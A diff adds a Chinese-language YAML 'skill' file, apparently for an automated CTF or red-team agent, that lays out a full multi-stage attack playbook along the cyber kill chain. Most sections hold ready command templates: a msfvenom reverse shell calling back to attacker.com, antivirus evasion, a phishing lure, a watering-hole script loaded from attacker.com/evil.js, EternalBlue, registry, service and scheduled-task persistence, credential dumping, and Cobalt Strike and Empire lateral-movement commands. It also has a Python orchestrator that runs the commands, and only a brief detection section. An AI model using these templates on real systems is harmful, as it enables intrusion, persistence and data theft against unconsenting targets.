@@ -1,0 +1,533 @@
+name: multi_stage_attack
+description: 多阶段攻击规划 - 涵盖攻击链设计、阶段划分、自动化执行、APT模拟等高级攻击策略技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [apt, attack-chain, multi-stage, planning, automation]
+priority: medium
+
+# 使用场景
+scenarios:
+  - APT攻击模拟演练
+  - 多阶段渗透测试规划
+  - 复杂环境攻击链设计
+  - 自动化攻击流程开发
+  - 红队行动规划
+
+# 核心技术
+techniques:
+  - 攻击链设计: 从侦察到持久化的完整攻击路径规划
+  - 阶段划分: 侦察、武器化、交付、利用、安装、C2、行动
+  - 自动化执行: 自动化攻击脚本编排与执行
+  - 条件分支: 基于环境反馈的动态攻击决策
+  - 失败恢复: 攻击失败时的备用路径与回退策略
+
+# 工具列表
+tools:
+  - Metasploit: 自动化攻击框架
+  - Cobalt Strike: Beacon攻击链
+  - Empire: PowerShell后渗透框架
+  - PoshC2: C2框架
+  - Covenant: .NET C2框架
+  - Sliver: 跨平台C2
+  - Caldera: MITRE自动化攻击模拟
+  - Atomic Red Team: ATT&CK原子测试
+
+# 网络杀伤链模型
+kill_chain:
+  - phases:
+      1_reconnaissance:
+        description: 信息收集阶段
+        actions:
+          - 目标识别: 确定攻击目标范围
+          - 资产发现: 识别关键资产与服务
+          - 人员情报: 收集组织人员信息
+          - 技术侦察: 扫描开放端口、服务版本
+        techniques:
+          - OSINT: 开源情报收集
+          - 社工侦察: LinkedIn、GitHub等信息
+          - 网络扫描: Nmap、Masscan端口扫描
+          - 域名枚举: 子域名、WHOIS信息
+        template: |
+          # 侦察阶段自动化脚本
+
+          # 1. 目标域名枚举
+          sublist3r -d target.com -o subdomains.txt
+
+          # 2. 端口扫描
+          nmap -iL subdomains.txt -p- -sV -oA ports_scan
+
+          # 3. Web应用识别
+          whatweb -i subdomains.txt --log web_info.txt
+
+          # 4. 目录扫描
+          gobuster dir -u https://target.com -w /path/to/wordlist
+
+          # 5. 人员信息收集
+          # LinkedIn scraping
+          # GitHub commit history analysis
+          # Email harvesting
+
+      2_weaponization:
+        description: 武器化阶段 - 准备攻击载荷
+        actions:
+          - 漏洞研究: 分析可利用漏洞
+          - 载荷开发: 开发定制攻击载荷
+          - 后门植入: 设计持久化机制
+          - C2准备: 配置命令控制基础设施
+        techniques:
+          - Payload定制: 针对目标环境的载荷开发
+          - 混淆加密: 载荷混淆与加密
+          - 分段传输: 大载荷分段传输
+        template: |
+          # 武器化阶段
+
+          # 1. 选择攻击向量
+          # 基于侦察结果选择最佳攻击路径
+
+          # 2. 生成载荷
+          msfvenom -p windows/x64/meterpreter/reverse_tcp \
+            LHOST=attacker.com LPORT=4444 -f exe -o payload.exe
+
+          # 3. 载荷混淆
+          # 使用Shellter免杀
+          shellter -a payload.exe
+
+          # 4. C2配置
+          # Cobalt Strike Listener配置
+          # Empire Listener设置
+
+      3_delivery:
+        description: 交付阶段 - 传递攻击载荷
+        actions:
+          - 鱼叉钓鱼: 定制钓鱼邮件
+          - 水坑攻击: 植入恶意代码到常用网站
+          - 供应链攻击: 通过信任源传递载荷
+          - 物理交付: USB投递等物理方式
+        techniques:
+          - 钓鱼邮件: HTML模板、恶意附件
+          - 水坑植入: XSS注入、恶意JS
+          - 供应链植入: CI/CD管道、依赖包
+        template: |
+          # 交付阶段
+
+          # 1. 钑鱼邮件
+          # 构建邮件模板
+          subject: "紧急: 系统升级通知"
+          attachment: "升级工具.exe" (payload)
+
+          # 2. 水坑攻击
+          # 在目标常用网站注入
+          <script src="https://attacker.com/evil.js"></script>
+
+          # 3. 供应链攻击
+          # 植入恶意依赖
+          pip install malicious-package
+          npm install malicious-npm-package
+
+      4_exploitation:
+        description: 利用阶段 - 执行攻击
+        actions:
+          - 漏洞利用: 利用目标漏洞获取初始访问
+          - 凭证窃取: 获取有效凭证
+          - 权限提升: 提升到更高权限
+          - 环境突破: 绕过安全限制
+        techniques:
+          - CVE利用: 已知漏洞利用
+          - 0-day利用: 针对特定目标的零日
+          - 凭证爆破: 密码喷洒、暴力破解
+          - 社工利用: 诱导用户执行恶意操作
+        template: |
+          # 利用阶段
+
+          # 1. Web应用漏洞利用
+          # SQL注入获取数据
+          sqlmap -u "http://target.com?id=1" --dbs
+
+          # 2. 远程服务漏洞
+          # SMB漏洞利用
+          nmap --script smb-vuln-* target
+
+          # EternalBlue (MS17-010)
+          msfconsole > use exploit/windows/smb/ms17_010_eternalblue
+
+          # 3. 凭证利用
+          # 破解获取的密码哈希
+          hashcat -m 1000 hashes.txt wordlist.txt
+
+      5_installation:
+        description: 安装阶段 - 建立持久化
+        actions:
+          - 后门安装: 安装持久化机制
+          - 植入位置: 选择隐蔽植入点
+          - 启动配置: 确保后门自动启动
+          - 伪装隐藏: 隐藏后门踪迹
+        techniques:
+          - 注册表持久化: Run keys、Services
+          - 计划任务: Scheduled Tasks
+          - WMI订阅: WMI事件订阅
+          - DLL劫持: DLL搜索顺序劫持
+        template: |
+          # 安装阶段 - 持久化
+
+          # Windows持久化技术
+
+          # 1. 注册表Run键
+          reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
+            /v Persistence /t REG_SZ /d "C:\temp\payload.exe"
+
+          # 2. 服务创建
+          sc create PersistenceService binPath= "C:\temp\payload.exe" start= auto
+
+          # 3. 计划任务
+          schtasks /create /tn "Persistence" /tr "C:\temp\payload.exe" \
+            /sc onlogon /rl HIGHEST
+
+          # 4. WMI事件订阅
+          # 使用Empire
+          empire > usemodule persistence/elevated/wmi*
+
+      6_command_and_control:
+        description: 命令控制阶段 - 建立C2通道
+        actions:
+          - C2建立: 建立稳定通信通道
+          - 隐蔽通信: 混淆C2流量
+          - 弹性架构: 多节点C2架构
+          - 协议模拟: 使用合法协议传输
+        techniques:
+          - HTTP/HTTPS: Web流量伪装
+          - DNS: DNS隧道通信
+          - ICMP: ICMP隐蔽通道
+          - Domain Fronting: 域前置技术
+        template: |
+          # C2阶段
+
+          # 1. HTTP C2
+          # Cobalt Strike HTTP Listener
+          # 配置合法-looking的profile
+
+          # 2. DNS C2
+          # 使用DNS作为通信通道
+          # Cobalt Strike DNS Beacon
+
+          # 3. Domain Fronting
+          # 通过CDN隐藏真实C2
+          # 使用云服务提供商的CDN
+
+          # 4. 多协议C2
+          # HTTP + DNS + ICMP混合
+          # 提高隐蔽性和可靠性
+
+      7_actions_on_objectives:
+        description: 行动阶段 - 完成最终目标
+        actions:
+          - 数据收集: 收集目标数据
+          - 数据外带: 将数据传输出去
+          - 横向移动: 扩展到更多系统
+          - 目标达成: 完成攻击目标
+        techniques:
+          - 数据收集: 文件搜索、数据库访问
+          - 数据压缩: 数据打包与加密
+          - 分段外带: 小批量隐蔽传输
+          - 系统破坏: 目标达成后的破坏行动
+        template: |
+          # 行动阶段
+
+          # 1. 数据收集
+          # 搜索敏感文件
+          dir /s /b *secret* *password* *confidential*
+
+          # 2. 数据库导出
+          # 导出数据库内容
+          mysqldump -u root -p --all-databases > all_databases.sql
+
+          # 3. 数据压缩加密
+          7z a -p"password" secrets.7z sensitive_files/
+
+          # 4. 数据外带
+          # DNS隧道外带
+          # ICMP隐蔽通道
+          # HTTPS分段传输
+
+# 多阶段攻击编排
+attack_orchestration:
+  - automated_workflow:
+    template: |
+      # 自动化攻击流程
+
+      # 使用Caldera进行自动化编排
+      # 或使用Python脚本编排
+
+      import subprocess
+      import json
+
+      class AttackChain:
+          def __init__(self, target):
+              self.target = target
+              self.results = {}
+              self.current_phase = 0
+
+          def execute_phase(self, phase_name, actions):
+              """执行单个攻击阶段"""
+              results = []
+              for action in actions:
+                  try:
+                      result = self.run_action(action)
+                      results.append({"action": action, "result": result, "status": "success"})
+                  except Exception as e:
+                      results.append({"action": action, "error": str(e), "status": "failed"})
+                      # 检查是否有备用路径
+                      if action.get("fallback"):
+                          self.execute_fallback(action["fallback"])
+
+              self.results[phase_name] = results
+              return results
+
+          def run_action(self, action):
+              """执行单个动作"""
+              cmd = action.get("command")
+              if cmd:
+                  return subprocess.run(cmd, shell=True, capture_output=True)
+              # 其他类型动作处理
+
+          def execute_fallback(self, fallback_actions):
+              """执行备用路径"""
+              return self.execute_phase("fallback", fallback_actions)
+
+      # 定义攻击链
+      attack_plan = {
+          "reconnaissance": [
+              {"command": "nmap -sV target", "timeout": 300},
+              {"command": "whatweb target", "timeout": 60}
+          ],
+          "exploitation": [
+              {"command": "msfconsole -x 'use exploit/...'", "fallback": [
+                  {"command": "alternative exploit"}
+              ]}
+          ]
+      }
+
+  - conditional_execution:
+    template: |
+      # 条件分支攻击
+
+      # 基于环境反馈动态决策
+
+      def adaptive_attack(target_info):
+          # 根据目标信息选择攻击路径
+
+          if target_info.get("os") == "windows":
+              attack_path = windows_attack_chain()
+          elif target_info.get("os") == "linux":
+              attack_path = linux_attack_chain()
+
+          # 根据开放端口选择
+          if "80" in target_info.get("ports"):
+              web_attack()
+          if "445" in target_info.get("ports"):
+              smb_attack()
+
+          # 根据安全措施调整
+          if target_info.get("has_waf"):
+              use_waf_bypass_techniques()
+
+          if target_info.get("has_edr"):
+              use_edr_evasion_techniques()
+
+# MITRE ATT&CK映射
+mitre_attack_mapping:
+  - initial_access:
+      - T1566: Phishing
+      - T1190: Exploit Public-Facing Application
+      - T1133: External Remote Services
+      - T1078: Valid Accounts
+
+  - execution:
+      - T1059: Command and Scripting Interpreter
+      - T1053: Scheduled Task/Job
+      - T1203: Exploitation for Client Execution
+
+  - persistence:
+      - T1547: Boot or Logon Autostart Execution
+      - T1053: Scheduled Task/Job
+      - T1574: Hijack Execution Flow
+
+  - privilege_escalation:
+      - T1548: Abuse Elevation Control Mechanism
+      - T1068: Exploitation for Privilege Escalation
+
+  - defense_evasion:
+      - T1562: Impair Defenses
+      - T1027: Obfuscated Files or Information
+
+  - credential_access:
+      - T1558: Steal or Forge Kerberos Tickets
+      - T1003: OS Credential Dumping
+
+  - discovery:
+      - T1046: Network Service Scanning
+      - T1018: Remote System Discovery
+
+  - lateral_movement:
+      - T1021: Remote Services
+      - T1072: Software Deployment Tools
+
+  - collection:
+      - T1560: Archive Collected Data
+      - T1005: Data from Local System
+
+  - command_and_control:
+      - T1071: Application Layer Protocol
+      - T1090: Proxy
+
+  - exfiltration:
+      - T1041: Exfiltration Over C2 Channel
+      - T1048: Exfiltration Over Alternative Protocol
+
+  - impact:
+      - T1486: Data Encrypted for Impact
+      - T1499: Endpoint Denial of Service
+
+# Atomic Red Team测试
+atomic_red_team:
+  - template: |
+      # Atomic Red Team - ATT&CK原子测试
+
+      # 安装
+      Import-Module Invoke-AtomicRedTeam
+
+      # 执行单个测试
+      Invoke-AtomicTest T1566.001 -PathToAtomicsFolder "C:\AtomicRedTeam"
+
+      # 执行所有Initial Access测试
+      Invoke-AtomicTest -Technique "Initial Access"
+
+      # 自定义测试执行
+      Invoke-AtomicTest T1059.001 -InputArgs "malicious_command"
+
+# Cobalt Strike攻击链
+cobalt_strike_chain:
+  - template: |
+      # Cobalt Strike Beacon攻击链
+
+      # 1. 创建Listener
+      # HTTP Listener
+      listeners -> add -> HTTP
+
+      # 2. 生成Payload
+      attacks -> packages -> Windows Executable (S)
+
+      # 3. 部署Beacon
+      # 通过钓鱼邮件或其他方式
+
+      # 4. Beacon命令
+      beacon> help
+
+      # 信息收集
+      beacon> net view
+      beacon> net computers
+      beacon> net domain_admins
+
+      # 横向移动
+      beacon> jump psexec [target] [listener]
+      beacon> jump winrm [target] [listener]
+
+      # 凭证收集
+      beacon> hashdump
+      beacon> logonpasswords
+
+      # 持久化
+      beacon> elevate svc-exe [listener]
+
+# Empire攻击链
+empire_chain:
+  - template: |
+      # Empire PowerShell攻击链
+
+      # 1. 启动Empire
+      ./empire
+
+      # 2. 创建Listener
+      (Empire) > listeners
+      (Empire) > uselistener http
+      (Empire: listeners/http) > set Port 80
+      (Empire: listeners/http) > execute
+
+      # 3. 生成Stager
+      (Empire) > stagers
+      (Empire) > usestager launcher http
+      (Empire: stagers/launcher/http) > execute
+
+      # 4. 执行Agent命令
+      (Empire: agents) > useagent [agent_name]
+
+      # 信息收集
+      (Empire: agent) > usemodule situational_awareness/host/computerinfo*
+
+      # 横向移动
+      (Empire: agent) > usemodule lateral_movement/invoke_wmi*
+
+      # 持久化
+      (Empire: agent) > usemodule persistence/elevated/registry*
+
+# 失败恢复策略
+failure_recovery:
+  - template: |
+      # 攻击失败恢复策略
+
+      # 1. 备用攻击路径
+
+      # 主路径失败时的替代方案
+      primary_path = {
+          "method": "exploit_cve_xxx",
+          "fallback": [
+              {"method": "credential_attack"},
+              {"method": "phishing_attack"},
+              {"method": "supply_chain_attack"}
+          ]
+      }
+
+      # 2. 环境适应
+
+      # WAF检测 -> 切换到隐蔽技术
+      if waf_detected:
+          switch_to_waf_bypass()
+
+      # EDR检测 -> 切换到内存执行
+      if edr_detected:
+          switch_to_memory_only_execution()
+
+      # 3. 连接恢复
+
+      # C2连接断开时的恢复
+      beacon = C2Connection()
+      if beacon.lost():
+          # 尝试备用C2
+          beacon.connect_backup_c2()
+          # 或等待重连窗口
+
+# 防御检测
+detection:
+  - 多阶段攻击检测:
+      - 监控异常网络流量模式
+      - 检测可疑进程创建链
+      - 分析异常登录模式
+      - 监控持久化机制创建
+      - 检测C2通信特征
+
+  - 防御建议:
+      - 实施分层防御策略
+      - 部署SIEM进行行为分析
+      - 建立威胁情报系统
+      - 定期进行红队演练
+      - 实施最小权限原则
+      - 强化终端检测响应(EDR)
+
+# 参考资源
+references:
+  - https://attack.mitre.org/
+  - https://github.com/redcanaryco/atomic-red-team
+  - https://github.com/mitre/caldera
+  - https://www.cobaltstrike.com/
+  - https://github.com/BC-SECURITY/Empire
+  - https://github.com/sliverimplant/sliver
+  - https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
